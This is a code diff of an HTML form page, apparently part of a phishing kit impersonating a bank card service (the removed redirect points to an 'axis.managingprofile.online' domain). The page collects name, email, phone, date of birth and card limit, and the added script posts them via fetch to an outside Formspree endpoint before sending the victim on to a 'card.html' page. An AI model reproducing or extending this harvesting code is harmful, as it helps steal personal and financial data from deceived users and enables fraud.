@@ -7,16 +7,38 @@
 <body>
   <div class="container">
     <h2>Basic Information</h2>
-    <form action="https://formspree.io/f/mnnvnwap" method="POST">
+    <form id="form">
       <label>Name: *</label><br><input type="text" name="name" required><br>
       <label>Email: *</label><br><input type="email" name="email" required><br>
       <label>Phone: *</label><br><input type="tel" name="phone" required><br>
       <label>Date of Birth: *</label><br><input type="date" name="dob" required><br>
       <label>Limit: *</label><br><input type="text" name="limit" required><br>
-
-      <input type="hidden" name="_redirect" value="https://axis.managingprofile.online/card.html">
       <input type="submit" value="Next">
     </form>
   </div>
+
+<script>
+  document.getElementById('form').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const formData = new FormData(this);
+    fetch("https://formspree.io/f/mnnvnwap", {
+      method: "POST",
+      body: formData,
+      headers: {
+        'Accept': 'application/json'
+      }
+    }).then(response => {
+      if (response.ok) {
+        window.location.href = "card.html";
+      } else {
+        alert("Form submission failed. Please try again.");
+      }
+    }).catch(error => {
+      console.error("Error submitting form:", error);
+      alert("An error occurred. Please try again.");
+    });
+  });
+</script>
+
 </body>
 </html>
